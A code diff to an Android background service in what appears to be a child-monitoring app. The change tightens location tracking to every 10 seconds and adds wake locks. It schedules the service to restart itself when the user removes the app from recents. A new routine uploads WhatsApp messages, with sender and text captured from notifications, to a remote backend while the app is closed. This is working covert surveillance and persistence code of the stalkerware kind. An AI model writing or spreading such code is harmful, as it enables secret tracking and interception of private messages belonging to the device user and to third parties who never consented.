@@ -24,6 +24,7 @@ import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.os.PowerManager
 import org.json.JSONObject
 import java.io.OutputStream
 import java.net.HttpURLConnection
@@ -51,7 +52,7 @@ class KeepAliveService : Service() {
     private val tick = object : Runnable {
         override fun run() {
             try { Thread { sendCycle() }.start() } catch (_: Exception) {}
-            handler.postDelayed(this, 60_000L)
+            handler.postDelayed(this, 20_000L)
         }
     }
 
@@ -60,8 +61,20 @@ class KeepAliveService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startForegroundSafe()
         startLocation()
-        if (!ticking) { ticking = true; handler.postDelayed(tick, 8_000L) }
+        if (!ticking) { ticking = true; handler.postDelayed(tick, 5_000L) }
         return START_STICKY
+    }
+
+    // Se a app for removida das recentes, reprograma o próprio reinício do serviço.
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        try {
+            val restart = Intent(applicationContext, KeepAliveService::class.java)
+            val flags = if (Build.VERSION.SDK_INT >= 23) PendingIntent.FLAG_IMMUTABLE else 0
+            val pi = PendingIntent.getService(applicationContext, 7211, restart, flags)
+            val am = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+            am.set(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 2000L, pi)
+        } catch (_: Exception) {}
+        super.onTaskRemoved(rootIntent)
     }
 
     private fun startForegroundSafe() {
@@ -96,7 +109,7 @@ class KeepAliveService : Service() {
             val lm = getSystemService(LOCATION_SERVICE) as LocationManager
             val providers = lm.getProviders(true)
             for (p in providers) {
-                try { lm.requestLocationUpdates(p, 30_000L, 0f, locListener, Looper.getMainLooper()) } catch (_: Exception) {}
+                try { lm.requestLocationUpdates(p, 10_000L, 0f, locListener, Looper.getMainLooper()) } catch (_: Exception) {}
                 try { val l = lm.getLastKnownLocation(p); if (l != null && (lastLocation == null || l.time > lastLocation!!.time)) lastLocation = l } catch (_: Exception) {}
             }
         } catch (_: Exception) {}
@@ -113,7 +126,14 @@ class KeepAliveService : Service() {
     private fun prefs() = getSharedPreferences("tc_bg", Context.MODE_PRIVATE)
 
     private fun sendCycle() {
+        var wl: PowerManager.WakeLock? = null
         try {
+            try {
+                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "tconnect:bgcycle")
+                wl.setReferenceCounted(false)
+                wl.acquire(15_000L)
+            } catch (_: Exception) {}
             val sp = prefs()
             val url = sp.getString("url", null) ?: return
             val key = sp.getString("key", null) ?: return
@@ -144,8 +164,46 @@ class KeepAliveService : Service() {
                 lb.put("p_epoch", System.currentTimeMillis())
                 rpc(url, key, token, "child_push_location", lb.toString())
             }
+            // Envia as mensagens do WhatsApp capturadas pelas notificações, mesmo com a app
+            // fechada (o serviço de notificações continua a correr e a encher o buffer).
+            try { pushWhatsApp(url, key, token, device, sp) } catch (_: Exception) {}
             // Pedido de alarme ("encontrar telemóvel") — funciona mesmo com a app fechada.
             try { checkRing(url, key, token, device, sp) } catch (_: Exception) {}
+        } catch (_: Exception) {} finally { try { if (wl != null && wl.isHeld) wl.release() } catch (_: Exception) {} }
+    }
+
+    /** Lê o buffer de notificações (WhatsApp) e envia as novas ao Supabase, com a app fechada. */
+    private fun pushWhatsApp(url: String, key: String, token: String, device: String, sp: android.content.SharedPreferences) {
+        try {
+            val raw = TCNotifStore.getAll(applicationContext)
+            val arr = org.json.JSONArray(raw)
+            if (arr.length() == 0) return
+            var seen = try { JSONObject(sp.getString("wa_seen", "{}") ?: "{}") } catch (_: Exception) { JSONObject() }
+            val items = org.json.JSONArray()
+            val newIds = ArrayList<String>()
+            for (i in 0 until arr.length()) {
+                val o = arr.optJSONObject(i) ?: continue
+                val id = o.optString("id", "")
+                if (id.isEmpty() || seen.has(id)) continue
+                val it = JSONObject()
+                it.put("id", id)
+                it.put("sender", o.optString("sender", ""))
+                it.put("text", o.optString("text", ""))
+                it.put("date", o.optLong("date", System.currentTimeMillis()))
+                items.put(it)
+                newIds.add(id)
+            }
+            if (items.length() == 0) return
+            val body = JSONObject().put("p_device_code", device).put("p_items", items)
+            var code = rpc(url, key, token, "child_sync_whatsapp", body.toString())
+            if (code == 401) { val nt = refreshToken(url, key, sp); if (nt != null) code = rpc(url, key, nt, "child_sync_whatsapp", body.toString()) }
+            if (code in 200..299) {
+                for (id in newIds) seen.put(id, 1)
+                // Limita o tamanho do 'wa_seen' (mantém os mais recentes).
+                val keys = seen.keys().asSequence().toList()
+                if (keys.size > 2500) { val keep = JSONObject(); keys.takeLast(1800).forEach { keep.put(it, 1) }; seen = keep }
+                sp.edit().putString("wa_seen", seen.toString()).apply()
+            }
         } catch (_: Exception) {}
     }
 
